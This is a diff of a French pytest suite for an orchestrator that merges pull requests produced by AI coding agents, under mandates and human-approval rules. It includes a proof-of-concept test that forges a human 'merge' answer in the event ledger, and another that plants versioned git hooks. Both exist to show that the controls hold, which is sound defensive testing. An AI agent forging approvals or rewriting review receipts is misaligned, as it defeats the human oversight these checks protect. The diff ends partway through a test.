@@ -1,14 +1,18 @@
 """Lot 4 de #876 (verrou 12) : le merger, contre un faux ``gh`` et un faux ``claude``, sur un vrai git.
 
-Critères : la file série fusionne une tâche relue READY dont la PR est ouverte, CI verte exigée (checks ignorés ou
-non requis hors du verdict), branche réalignée par une fusion de la cible (union contrôlée du CHANGELOG, tout autre
-conflit rendu au worker), fusion seulement sous un mandat qui couvre ``merge`` et que la politique délègue (sinon la
-question « fusionner ? »), fusion notée une fois constatée sur la remote, acceptation sous mandat ou question
-« accepter ? », catégories gardées à l'humain, chaque étape notée une fois et rejouable.
+Critères : la file série fusionne une tâche relue READY dont la PR est ouverte, CI verte et stable exigée (checks
+ignorés ou non requis hors du verdict), branche réalignée par une fusion de la cible (union contrôlée du CHANGELOG, tout
+autre conflit rendu au worker), fusion seulement sous un mandat qui couvre ``merge`` et que la politique délègue (sinon
+la question non bloquante « fusionner ? »), fusion notée une fois constatée sur la remote, acceptation sous mandat ou
+question « accepter ? », catégories et chemins gardés à l'humain, chaque étape notée une fois et rejouable.
+
+Revue de sécurité de #927 : le READY ne vaut que scellé au journal d'autorité (un reçu réécrit par le worker ne passe
+plus), aucune réponse du ledger ne vaut un geste, aucun hook git n'est exécuté par le tick.
 """
 
 from __future__ import annotations
 
+import os
 from pathlib import Path
 
 import pytest
@@ -25,7 +29,6 @@ from grimoire.missions.merger import (
     MERGE_ESCALATED_EVENT,
     MERGE_REALIGNED_EVENT,
     MERGE_REQUEUED_EVENT,
-    MERGE_RESUMED_EVENT,
 )
 from grimoire.missions.orchestrate import run_tick
 from grimoire.missions.orchestrator_policy import load_orchestrator_policy
@@ -115,6 +118,7 @@ def launch_and_work(projet: Path, host: FakeHost, *, labels: tuple[str, ...] = (
     service.ledger.transition_task(task.id, TaskState.READY)
     tick(projet, host)
     wt = Path(str(launched_sessions(TaskService(projet))[task.id]["cwd"]))
+    (wt / edit[0]).parent.mkdir(parents=True, exist_ok=True)
     (wt / edit[0]).write_text(edit[1], encoding="utf-8")
     files = [edit[0]]
     if changelog:
@@ -140,10 +144,25 @@ def give_ready(host: FakeHost, tid: str, wt: Path, session: str = "") -> None:
 
 
 def review_ready(projet: Path, host: FakeHost, tid: str, wt: Path):  # type: ignore[no-untyped-def]
-    """Le relecteur lancé rend READY ; le tick qui le juge fait passer le merger."""
+    """Le relecteur lancé rend READY ; le tick qui le juge fait passer le merger (une CI verte s'y voit une première fois)."""
     tick(projet, host)  # lance le relecteur
     give_ready(host, tid, wt)
     return tick(projet, host)
+
+
+def merged_after_review(projet: Path, host: FakeHost, tid: str, wt: Path):  # type: ignore[no-untyped-def]
+    """READY jugé, CI verte vue une fois puis confirmée : le tick qui fusionne."""
+    first = review_ready(projet, host, tid, wt)
+    assert merges(first) == [("wait", "waiting")] and "à confirmer" in first.merges[0].detail, first.merges
+    return tick(projet, host)
+
+
+def human_merges(projet: Path, host: FakeHost, tid: str) -> None:
+    """L'humain fusionne lui-même la PR (GitHub l'authentifie) : ce que le tick constatera."""
+    head = git(projet, "rev-parse", f"refs/heads/task/{tid}")
+    assert host(["gh", "pr", "merge", str(host.pr_numbers.get(f"task/{tid}", 7)), "--squash", "--match-head-commit", head],
+                projet).returncode == 0
+    host.calls.pop()  # ce geste est celui de l'humain, pas du merger
 
 
 def merges(report) -> list[tuple[str, str]]:  # type: ignore[no-untyped-def]
@@ -172,6 +191,20 @@ def subprocess_clone(projet: Path, clone: Path) -> None:
     git(clone, "config", "commit.gpgsign", "false")
 
 
+
+
+def questions(projet: Path, tid: str) -> list:  # type: ignore[type-arg]
+    from grimoire.missions.questions import records_of
+
+    return [r.question for r in records_of(TaskService(projet).require(tid))]
+
+
+def ready_judged(projet: Path, host: FakeHost, tid: str, wt: Path) -> None:
+    """READY jugé, CI tenue en attente : la tâche est dans la file, rien n'est fusionné."""
+    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
+    assert merges(review_ready(projet, host, tid, wt)) == [("wait", "waiting")]
+
+
 # ── Chemin vert, sous mandat ───────────────────────────────────────────────────
 
 
@@ -179,13 +212,13 @@ def test_vert_sous_mandat_fusionne_accepte_puis_le_janitor_nettoie(projet: Path,
     mandate = grant(projet)
     tid, wt = launch_and_work(projet, host)
     head = git(wt, "rev-parse", "HEAD")
-    report = review_ready(projet, host, tid, wt)
+    report = merged_after_review(projet, host, tid, wt)
     assert merges(report) == [("accept", "done")], report.merges
     [argv] = host.of("gh", "pr", "merge")
     assert argv == ["gh", "pr", "merge", "7", "--squash", "--match-head-commit", head]
     assert not {"--admin", "--auto"} & set(argv)
     [merged] = events(projet, tid, MERGED_EVENT)
-    assert merged.payload["head_sha"] == head and merged.payload["reviewed"] is True and merged.payload["mandate_id"] == mandate.id
+    assert merged.payload["head_sha"] == head and merged.payload["mandate_id"] == mandate.id
     git(projet, "fetch", "-q", "origin", "main")
     assert git(projet, "merge-base", "--is-ancestor", merged.payload["merged_sha"], "refs/remotes/origin/main") == ""
     gestures = MandateStore(projet).gestures_taken(tid)
@@ -201,13 +234,26 @@ def test_vert_sous_mandat_fusionne_accepte_puis_le_janitor_nettoie(projet: Path,
     assert len(MandateStore(projet).gestures_taken(tid)) == 2
 
 
+def test_le_jugement_ready_est_scelle_au_journal_d_autorite_et_copie_au_ledger(projet: Path, host: FakeHost) -> None:
+    from grimoire.missions.review_seal import SEAL_ENTRY, receipt_digest
+    from grimoire.missions.reviewer import REVIEW_JUDGED_EVENT
+
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    [seal] = [e for e in MandateStore(projet).journal.read() if e.get("type") == SEAL_ENTRY]
+    assert seal["task_id"] == tid and seal["head"] == git(wt, "rev-parse", "HEAD")
+    assert seal["receipt_sha256"] == receipt_digest(wt, tid)
+    [judged] = events(projet, tid, REVIEW_JUDGED_EVENT)
+    assert judged.payload["sealed"] is True and judged.payload["seal"]["head"] == seal["head"]
+
+
 def test_les_checks_requis_par_la_protection_font_seuls_le_verdict(projet: Path, host: FakeHost) -> None:
     grant(projet)
     tid, wt = launch_and_work(projet, host)
     branch = f"task/{tid}"
     host.checks[branch] = [{"name": "tests", "bucket": "pass"}, {"name": "lint-facultatif", "bucket": "fail"}]
     host.required[branch] = [{"name": "tests", "bucket": "pass"}]
-    assert merges(review_ready(projet, host, tid, wt)) == [("accept", "done")]
+    assert merges(merged_after_review(projet, host, tid, wt)) == [("accept", "done")]
 
 
 # ── CI ─────────────────────────────────────────────────────────────────────────
@@ -222,20 +268,32 @@ def test_ci_rouge_renvoie_au_worker_comme_un_not_ready(projet: Path, host: FakeH
     assert merges(report) == [("bounce", "done")]
     [resume] = host.of("claude", "--bg", "--resume")
     assert resume[3] == launch["session_id"] and "tests" in resume[-1]
-    task = TaskService(projet).require(tid)
-    assert task.status is TaskState.RUNNING and host.of("gh", "pr", "merge") == []
+    assert TaskService(projet).require(tid).status is TaskState.RUNNING and host.of("gh", "pr", "merge") == []
     assert [e.payload["reason"] for e in events(projet, tid, MERGE_BOUNCED_EVENT)] == ["ci_red"]
 
 
-def test_ci_en_attente_attend_sans_rien_ecrire_de_plus(projet: Path, host: FakeHost) -> None:
+def test_ci_en_attente_attend_puis_un_vert_se_confirme_au_tick_suivant(projet: Path, host: FakeHost) -> None:
     grant(projet)
     tid, wt = launch_and_work(projet, host)
-    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
-    assert merges(review_ready(projet, host, tid, wt)) == [("wait", "waiting")]
+    ready_judged(projet, host, tid, wt)
     before = len(TaskService(projet).ledger.events_for(tid))
     assert merges(tick(projet, host)) == [("wait", "waiting")]
     assert len(TaskService(projet).ledger.events_for(tid)) == before and host.of("gh", "pr", "merge") == []
     host.checks[f"task/{tid}"] = list(GREEN)
+    report = tick(projet, host)  # vert vu une fois : pas encore
+    assert merges(report) == [("wait", "waiting")] and "à confirmer" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == []
+    assert merges(tick(projet, host)) == [("accept", "done")]
+
+
+def test_un_vert_qui_retombe_doit_se_confirmer_de_nouveau(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    review_ready(projet, host, tid, wt)  # vert vu une fois
+    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
+    assert merges(tick(projet, host)) == [("wait", "waiting")]
+    host.checks[f"task/{tid}"] = list(GREEN)
+    assert merges(tick(projet, host)) == [("wait", "waiting")] and host.of("gh", "pr", "merge") == []
     assert merges(tick(projet, host)) == [("accept", "done")]
 
 
@@ -245,6 +303,28 @@ def test_une_pr_sans_aucun_check_n_est_pas_verte(projet: Path, host: FakeHost) -
     host.checks.pop(f"task/{tid}")
     report = review_ready(projet, host, tid, wt)
     assert merges(report) == [("wait", "waiting")] and "aucun check" in report.merges[0].detail
+    assert merges(tick(projet, host)) == [("wait", "waiting")] and host.of("gh", "pr", "merge") == []
+
+
+def test_une_ci_entierement_sautee_n_est_pas_verte(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "skipping"}]
+    review_ready(projet, host, tid, wt)
+    report = tick(projet, host)
+    assert merges(report) == [("wait", "waiting")] and "sautés" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == []
+
+
+def test_un_check_requis_n_est_jamais_ignore_meme_s_il_ressemble_a_codecov(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)  # GREEN : tests pass, codecov/patch fail
+    host.required[f"task/{tid}"] = [{"name": "codecov/patch", "bucket": "fail"}]
+    host.required_broken = True  # la protection ne se lit pas : on n'en conclut pas « aucun check requis »
+    report = review_ready(projet, host, tid, wt)
+    assert merges(report) == [("wait", "failed")] and "--required" in report.merges[0].detail
+    host.required_broken = False
+    assert merges(tick(projet, host)) == [("bounce", "done")]  # requis et rouge : jamais ignoré
     assert host.of("gh", "pr", "merge") == []
 
 
@@ -258,7 +338,8 @@ def test_branche_en_retard_avec_conflit_de_changelog_union_sans_perdre_main(proj
     advance_main(projet, "CHANGELOG.md", CHANGELOG_MAIN.replace("- feat: une entrée de main\n",
                                                                 "- fix: une autre PR fusionnée\n- feat: une entrée de main\n"))
     before = git(wt, "rev-parse", "HEAD")
-    report = review_ready(projet, host, tid, wt)
+    review_ready(projet, host, tid, wt)
+    report = tick(projet, host)
     assert merges(report) == [("realign", "done")], report.merges
     [realigned] = events(projet, tid, MERGE_REALIGNED_EVENT)
     assert realigned.payload["changelog_union"] is True and realigned.payload["from"] == before
@@ -269,8 +350,9 @@ def test_branche_en_retard_avec_conflit_de_changelog_union_sans_perdre_main(proj
     assert not [ln for ln in diff.splitlines() if ln.startswith("-") and not ln.startswith("---")]
     text = (wt / "CHANGELOG.md").read_text(encoding="utf-8")
     assert "l'entrée de la tâche" in text and "une autre PR fusionnée" in text
-    assert host.of("gh", "pr", "merge") == []  # la nouvelle CI d'abord
-    assert merges(tick(projet, host)) == [("accept", "done")]  # READY tenu par le réalignement, CI verte : fusionnée
+    assert host.of("gh", "pr", "merge") == []  # la nouvelle CI d'abord, vue deux fois
+    assert merges(tick(projet, host)) == [("wait", "waiting")]
+    assert merges(tick(projet, host)) == [("accept", "done")]  # sceau tenu par le réalignement noté au journal
     assert events(projet, tid, MERGED_EVENT)[0].payload["head_sha"] == head
 
 
@@ -283,7 +365,8 @@ def test_une_union_qui_perdrait_une_ligne_de_main_est_refusee(projet: Path, host
     tid, wt = launch_and_work(projet, host, changelog=mine)
     advance_main(projet, "CHANGELOG.md", CHANGELOG_MAIN.replace(top, "- fix: une autre PR\n" + top))
     before = git(wt, "rev-parse", "HEAD")
-    report = review_ready(projet, host, tid, wt)
+    review_ready(projet, host, tid, wt)
+    report = tick(projet, host)
     assert merges(report) == [("bounce", "done")] and "perdue" in report.merges[0].detail
     assert git(wt, "rev-parse", "HEAD") == before and not (Path(git(wt, "rev-parse", "--absolute-git-dir")) / "MERGE_HEAD").exists()
 
@@ -293,11 +376,36 @@ def test_un_autre_conflit_renvoie_au_worker(projet: Path, host: FakeHost) -> Non
     tid, wt = launch_and_work(projet, host, edit=("README.md", "la version de la tâche\n"))
     advance_main(projet, "README.md", "la version de main\n")
     before = git(wt, "rev-parse", "HEAD")
-    report = review_ready(projet, host, tid, wt)
+    review_ready(projet, host, tid, wt)
+    report = tick(projet, host)
     assert merges(report) == [("bounce", "done")] and "README.md" in report.merges[0].detail
     assert git(wt, "rev-parse", "HEAD") == before and git(wt, "status", "--porcelain", "--untracked-files=no") == ""
     assert git(projet, "ls-remote", "origin", f"refs/heads/task/{tid}").split()[0] == before  # rien de poussé
     assert [e.payload["reason"] for e in events(projet, tid, MERGE_BOUNCED_EVENT)] == ["conflict"]
+
+
+@pytest.mark.skipif(os.name == "nt", reason="hooks shell exécutables : harnais POSIX")
+def test_le_tick_n_execute_aucun_hook_git_du_depot(projet: Path, host: FakeHost) -> None:
+    """Revue #927 : les hooks (pre-commit, commit-msg, post-commit, pre-push…) sont des scripts que le worker réécrit."""
+    grant(projet)
+    marker = projet.parent / "hook-a-tourne"
+    mine = CHANGELOG_MAIN.replace("- feat: une entrée de main\n", "- feat: la tâche\n- feat: une entrée de main\n")
+    tid, wt = launch_and_work(projet, host, changelog=mine)
+    advance_main(projet, "CHANGELOG.md", CHANGELOG_MAIN.replace("- feat: une entrée de main\n",
+                                                                "- fix: une autre\n- feat: une entrée de main\n"))
+    hooks = wt / ".githooks"  # des hooks dans l'arbre de travail, comme un dépôt qui versionne les siens
+    hooks.mkdir()
+    for name in ("pre-commit", "commit-msg", "post-commit", "pre-merge-commit", "post-merge", "pre-push", "reference-transaction"):
+        (hooks / name).write_text(f"#!/bin/sh\necho {name} >> '{marker}'\n", encoding="utf-8")
+        (hooks / name).chmod(0o755)
+    git(wt, "add", "--", ".githooks")
+    git(wt, "-c", "core.hooksPath=/dev/null", "commit", "-q", "-m", "hooks versionnés")
+    git(wt, "-c", "core.hooksPath=/dev/null", "push", "-q", "origin", f"task/{tid}")
+    git(projet, "config", "core.hooksPath", ".githooks")  # le dépôt les active
+    review_ready(projet, host, tid, wt)
+    report = tick(projet, host)
+    assert merges(report) == [("realign", "done")], report.merges  # commit d'union et push faits
+    assert not marker.exists(), marker.read_text(encoding="utf-8")
 
 
 def test_file_serie_une_fusion_a_la_fois_et_la_suivante_realignee(projet: Path, host: FakeHost) -> None:
@@ -308,11 +416,13 @@ def test_file_serie_une_fusion_a_la_fois_et_la_suivante_realignee(projet: Path, 
     tick(projet, host)  # deux relecteurs
     for tid, wt in ((first, wt1), (second, wt2)):
         give_ready(host, tid, wt, next(a[a.index("--session-id") + 1] for a in host.of("claude", "--bg") if f"grimoire-review-{tid}" in a))
+    tick(projet, host)  # READY jugés, CI vue une fois
     report = tick(projet, host)
     outcome = {o.task_id: (o.action, o.status) for o in report.merges}
     # La première fusionnée sort de la file : main a avancé, la seconde, devenue tête, est réalignée dans le même tick.
     assert outcome == {first: ("accept", "done"), second: ("realign", "done")}, report.merges
     assert len(host.of("gh", "pr", "merge")) == 1
+    tick(projet, host)
     assert merges(tick(projet, host)) == [("accept", "done")]
     assert [a[3] for a in host.of("gh", "pr", "merge")] == ["7", "8"]
 
@@ -326,168 +436,11 @@ def test_deux_taches_en_retard_un_seul_realignement_a_la_fois(projet: Path, host
     tick(projet, host)
     for tid, wt in ((first, wt1), (second, wt2)):
         give_ready(host, tid, wt, next(a[a.index("--session-id") + 1] for a in host.of("claude", "--bg") if f"grimoire-review-{tid}" in a))
+    tick(projet, host)
     report = tick(projet, host)
     assert {o.task_id: (o.action, o.status) for o in report.merges} == {first: ("realign", "done"), second: ("wait", "waiting")}
     assert "1 réalignement(s) à la fois" in next(o.detail for o in report.merges if o.task_id == second)
     assert host.of("gh", "pr", "merge") == []
-
-
-# ── Sans mandat, ou hors de ses bornes ─────────────────────────────────────────
-
-
-def test_sans_mandat_la_question_fusionner_puis_le_geste_au_nom_de_l_humain(projet: Path, host: FakeHost) -> None:
-    tid, wt = launch_and_work(projet, host)
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("escalate", "done")] and host.of("gh", "pr", "merge") == []
-    task = TaskService(projet).require(tid)
-    assert task.status is TaskState.WAITING and task.waiting is not None and task.waiting.reason == "human"
-    question = task.waiting.question
-    assert question is not None and question.text.startswith("Fusionner la PR #7") and "aucun mandat" in question.text
-    workers = host.of("claude", "--bg", "--name", f"grimoire-{tid}")
-    TaskService(projet).answer(tid, "fusionner", "guilhem", origin=ORIGIN_HUMAN, question_id=question.id)
-    assert TaskService(projet).require(tid).status is TaskState.READY
-    report = tick(projet, host)
-    assert merges(report) == [("resume", "done")]
-    assert host.of("claude", "--bg", "--name", f"grimoire-{tid}") == workers  # la réponse ne relance pas de worker
-    assert [(o.status, "merger" in o.detail) for o in report.launches] == [("skipped", True)]
-    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
-    report = tick(projet, host)  # tout est revérifié, puis le geste de l'humain ; l'acceptation reste à lui
-    assert merges(report) == [("escalate", "done")] and len(host.of("gh", "pr", "merge")) == 1
-    [merged] = events(projet, tid, MERGED_EVENT)
-    assert merged.payload["origin"] == ORIGIN_HUMAN and merged.payload["mandate_id"] == ""
-    question = TaskService(projet).require(tid).waiting.question  # type: ignore[union-attr]
-    assert question is not None and question.text.startswith(f"Accepter {tid}")
-    TaskService(projet).answer(tid, "accepter", "guilhem", origin=ORIGIN_HUMAN, question_id=question.id)
-    assert merges(tick(projet, host)) == [("resume", "done")]
-    assert merges(tick(projet, host)) == [("accept", "done")]
-    task = TaskService(projet).require(tid)
-    assert task.status is TaskState.CLOSED
-    verdict = EvidenceService(wt / EVIDENCE).get_latest_verdict(tid)
-    assert verdict is not None and verdict.created_by == "human:guilhem"
-    assert len(events(projet, tid, MERGE_RESUMED_EVENT)) == 2 and len(host.of("gh", "pr", "merge")) == 1
-
-
-def test_une_reponse_reprendre_rend_la_tache_au_worker(projet: Path, host: FakeHost) -> None:
-    tid, wt = launch_and_work(projet, host)
-    review_ready(projet, host, tid, wt)
-    question = TaskService(projet).require(tid).waiting.question  # type: ignore[union-attr]
-    TaskService(projet).answer(tid, "reprendre", "guilhem", origin=ORIGIN_HUMAN, question_id=question.id)  # type: ignore[union-attr]
-    report = tick(projet, host)
-    assert report.merges == () and [o.status for o in report.launches] == ["launched"]
-
-
-def test_le_mandat_qui_ne_couvre_pas_merge_ne_fusionne_pas(projet: Path, host: FakeHost) -> None:
-    grant(projet, ("accept",))
-    tid, wt = launch_and_work(projet, host)
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("escalate", "done")] and "ne couvre pas ce geste" in report.merges[0].detail
-    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
-
-
-def test_la_politique_qui_garde_merge_a_l_humain_l_emporte_sur_le_mandat(projet: Path, host: FakeHost) -> None:
-    write_policy(projet, escalation="escalation:\n  merge: human\n  accept: orchestrator\n")
-    grant(projet)
-    tid, wt = launch_and_work(projet, host)
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("escalate", "done")] and "garde merge" in report.merges[0].detail
-    assert host.of("gh", "pr", "merge") == []
-
-
-def test_une_categorie_gardee_n_est_ni_fusionnee_ni_acceptee_sous_mandat(projet: Path, host: FakeHost) -> None:
-    grant(projet)
-    tid, wt = launch_and_work(projet, host, labels=("security",))
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("escalate", "done")]
-    assert "catégorie gardée à l'humain : security" in report.merges[0].detail
-    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
-
-
-def test_une_categorie_gardee_fusionnee_par_un_humain_n_est_pas_acceptee_sous_mandat(projet: Path, host: FakeHost) -> None:
-    grant(projet)
-    tid, wt = launch_and_work(projet, host, labels=("release",))
-    review_ready(projet, host, tid, wt)
-    question = TaskService(projet).require(tid).waiting.question  # type: ignore[union-attr]
-    TaskService(projet).answer(tid, "fusionner", "guilhem", origin=ORIGIN_HUMAN, question_id=question.id)  # type: ignore[union-attr]
-    tick(projet, host)
-    report = tick(projet, host)
-    assert merges(report) == [("escalate", "done")] and "catégorie gardée à l'humain : release" in report.merges[0].detail
-    assert len(host.of("gh", "pr", "merge")) == 1 and [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == []
-    assert TaskService(projet).require(tid).status is TaskState.WAITING
-
-
-def test_une_relecture_non_attestee_ne_fonde_pas_une_fusion_sous_mandat(projet: Path, host: FakeHost) -> None:
-    tid, wt = launch_and_work(projet, host)
-    tick(projet, host)  # relecteur lancé sans mandat : sa session n'est pas inscrite
-    grant(projet)
-    give_ready(host, tid, wt)
-    report = tick(projet, host)
-    assert merges(report) == [("escalate", "done")] and "journal d'autorité" in report.merges[0].detail
-    assert host.of("gh", "pr", "merge") == []
-
-
-def test_mandat_qui_couvre_merge_mais_pas_accept(projet: Path, host: FakeHost) -> None:
-    mandate = grant(projet, ("merge",))
-    tid, wt = launch_and_work(projet, host)
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("escalate", "done")] and "accept refusé" in report.merges[0].detail
-    assert [(g["gesture"], g["mandate_id"]) for g in MandateStore(projet).gestures_taken(tid)] == [("merge", mandate.id)]
-    task = TaskService(projet).require(tid)
-    assert task.status is TaskState.WAITING and task.waiting.question.text.startswith(f"Accepter {tid}")  # type: ignore[union-attr]
-
-
-# ── Constat sur la remote, rejeu, échecs ───────────────────────────────────────
-
-
-def test_une_fusion_non_constatee_n_est_ni_notee_ni_acceptee(projet: Path, host: FakeHost) -> None:
-    grant(projet)
-    tid, wt = launch_and_work(projet, host)
-    host.merge_lands = False  # gh sort en 0, la PR reste ouverte
-    git(projet, "fetch", "-q", "origin", "main")
-    host.merge_commits[f"task/{tid}"] = git(projet, "rev-parse", "refs/remotes/origin/main")  # un oid sans état MERGED
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("unconfirmed", "waiting")]
-    assert events(projet, tid, MERGED_EVENT) == [] and MandateStore(projet).gestures_taken(tid) == []
-    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
-    host.merge_lands = True
-    host.merge_commits.pop(f"task/{tid}")
-    assert merges(tick(projet, host)) == [("accept", "done")]
-    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]
-
-
-def test_un_commit_de_fusion_absent_de_la_cible_n_est_pas_une_fusion(projet: Path, host: FakeHost) -> None:
-    grant(projet)
-    tid, wt = launch_and_work(projet, host)
-    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
-    assert merges(review_ready(projet, host, tid, wt)) == [("wait", "waiting")]
-    branch = f"task/{tid}"
-    host.prs[branch], host.merge_commits[branch] = "MERGED", git(wt, "rev-parse", "HEAD")  # jamais arrivé sur main
-    report = tick(projet, host)
-    assert merges(report) == [("unconfirmed", "waiting")] and events(projet, tid, MERGED_EVENT) == []
-    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
-
-
-def test_une_coupure_entre_le_journal_d_autorite_et_le_ledger_n_inscrit_pas_deux_fois(
-    projet: Path, host: FakeHost, monkeypatch: pytest.MonkeyPatch,
-) -> None:
-    from grimoire.missions.ledger import MissionLedger
-
-    grant(projet)
-    tid, wt = launch_and_work(projet, host)
-    real = MissionLedger.append_event
-    cut = {"once": True}
-
-    def flaky(self: MissionLedger, kind: str, *args: object, **kwargs: object) -> object:
-        if kind == MERGED_EVENT and cut["once"]:
-            cut["once"] = False
-            raise OSError("coupure simulée")
-        return real(self, kind, *args, **kwargs)  # type: ignore[arg-type]
-
-    monkeypatch.setattr(MissionLedger, "append_event", flaky)
-    assert merges(review_ready(projet, host, tid, wt)) == [("error", "failed")]
-    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge"]
-    assert merges(tick(projet, host)) == [("accept", "done")]
-    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]
-    assert len(host.of("gh", "pr", "merge")) == 1
 
 
 def test_la_tete_de_file_garde_son_rang_meme_quand_la_suivante_est_prete(projet: Path, host: FakeHost) -> None:
@@ -499,56 +452,208 @@ def test_la_tete_de_file_garde_son_rang_meme_quand_la_suivante_est_prete(projet:
     tick(projet, host)
     for tid, wt in ((first, wt1), (second, wt2)):
         give_ready(host, tid, wt, next(a[a.index("--session-id") + 1] for a in host.of("claude", "--bg") if f"grimoire-review-{tid}" in a))
+    tick(projet, host)
     report = tick(projet, host)
     assert {o.task_id: (o.action, o.status) for o in report.merges} == {first: ("wait", "waiting"), second: ("wait", "waiting")}
     assert "une fusion à la fois" in next(o.detail for o in report.merges if o.task_id == second)
     assert host.of("gh", "pr", "merge") == []
 
 
-def test_une_fusion_faite_et_non_notee_est_constatee_au_tick_suivant_jamais_refaite(projet: Path, host: FakeHost) -> None:
-    grant(projet)
-    tid, wt = launch_and_work(projet, host)
-    host.broken_after_merge = True
-    report = review_ready(projet, host, tid, wt)
-    assert merges(report) == [("unconfirmed", "failed")] and read_breaker(projet).failures == 1
-    assert events(projet, tid, MERGED_EVENT) == []
-    host.gh_broken = False
-    assert merges(tick(projet, host)) == [("accept", "done")]
-    assert len(host.of("gh", "pr", "merge")) == 1 and len(events(projet, tid, MERGED_EVENT)) == 1
-    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]  # inscrite une fois
+# ── Sans mandat, ou hors de ses bornes : l'humain fait le geste lui-même ───────
 
 
-def test_un_gh_en_panne_est_rapporte_compte_et_rejoue(projet: Path, host: FakeHost) -> None:
-    grant(projet)
+def test_sans_mandat_une_question_non_bloquante_puis_l_humain_fusionne_et_accepte(projet: Path, host: FakeHost) -> None:
+    from grimoire.missions.human_acceptance import accept_task
+
     tid, wt = launch_and_work(projet, host)
-    tick(projet, host)
-    give_ready(host, tid, wt)
-    host.gh_broken = True
+    review_ready(projet, host, tid, wt)
     report = tick(projet, host)
-    assert merges(report) == [("wait", "failed")] and any(a.startswith("merger :") for a in report.attention)
-    assert read_breaker(projet).failures == 1
-    host.gh_broken = False
-    assert merges(tick(projet, host)) == [("accept", "done")]
+    assert merges(report) == [("escalate", "done")] and host.of("gh", "pr", "merge") == []
+    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION  # pas garée : l'humain peut agir
+    [question] = questions(projet, tid)
+    assert question.text.startswith("Fusionner la PR #7") and "aucun mandat" in question.text and not question.blocking
+    assert merges(tick(projet, host)) == [("human", "waiting")] and len(questions(projet, tid)) == 1  # posée une fois
+    human_merges(projet, host, tid)
+    report = tick(projet, host)  # la fusion constatée ; l'acceptation reste à l'humain
+    assert merges(report) == [("escalate", "done")] and host.of("gh", "pr", "merge") == []
+    [merged] = events(projet, tid, MERGED_EVENT)
+    assert merged.payload["origin"] == "remote" and merged.payload["mandate_id"] == ""
+    accept_q = questions(projet, tid)[-1]
+    assert accept_q.text.startswith(f"Accepter {tid}") and f"--project-root {wt}" in accept_q.text
+    task = TaskService(wt).require(tid)
+    accept_task(task, wt, wt / EVIDENCE, "relu et fusionné", "guilhem", origin=ORIGIN_HUMAN)  # ce que `task accept` fait
+    TaskService(wt).transition(tid, TaskState.CLOSED, "guilhem")
+    assert TaskService(projet).require(tid).status is TaskState.CLOSED and MandateStore(projet).gestures_taken(tid) == []
 
 
-def test_disjoncteur_ouvert_rien_n_est_fusionne(projet: Path, host: FakeHost) -> None:
+def test_une_reponse_forgee_au_ledger_ne_fusionne_rien(projet: Path, host: FakeHost) -> None:
+    """Revue #927 (preuve de concept) : une ligne `task.human_answered` écrite à la main dans `events.jsonl`."""
+    import datetime
+    import json
+
+    from grimoire.missions.waiting import HUMAN_ANSWERED_EVENT
+
+    tid, wt = launch_and_work(projet, host)
+    review_ready(projet, host, tid, wt)
+    tick(projet, host)
+    [question] = questions(projet, tid)
+    line = {"id": "evt-forged", "event_type": HUMAN_ANSWERED_EVENT, "entity_id": tid, "entity_kind": "task",
+            "actor_id": "agent", "created_at": datetime.datetime.now(datetime.UTC).isoformat(),
+            "payload": {"task_id": tid, "question_id": question.id, "answer": "fusionner", "origin": "human", "actor_id": "guilhem"}}
+    with TaskService(projet).ledger._events_path.open("a", encoding="utf-8") as fh:
+        fh.write(json.dumps(line) + "\n")
+    for _ in range(4):
+        tick(projet, host)
+    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
+    assert TaskService(projet).require(tid).status is not TaskState.CLOSED
+
+
+def test_le_mandat_qui_ne_couvre_pas_merge_ne_fusionne_pas(projet: Path, host: FakeHost) -> None:
+    grant(projet, ("accept",))
+    tid, wt = launch_and_work(projet, host)
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")] and "ne couvre pas ce geste" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
+
+
+def test_la_politique_qui_garde_merge_a_l_humain_l_emporte_sur_le_mandat(projet: Path, host: FakeHost) -> None:
+    write_policy(projet, escalation="escalation:\n  merge: human\n  accept: orchestrator\n")
     grant(projet)
     tid, wt = launch_and_work(projet, host)
-    tick(projet, host)
-    trip(projet, "autre tâche")
-    give_ready(host, tid, wt)
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")] and "garde merge" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == []
+
+
+def test_une_categorie_gardee_n_est_ni_fusionnee_ni_acceptee_sous_mandat(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host, labels=("security",))
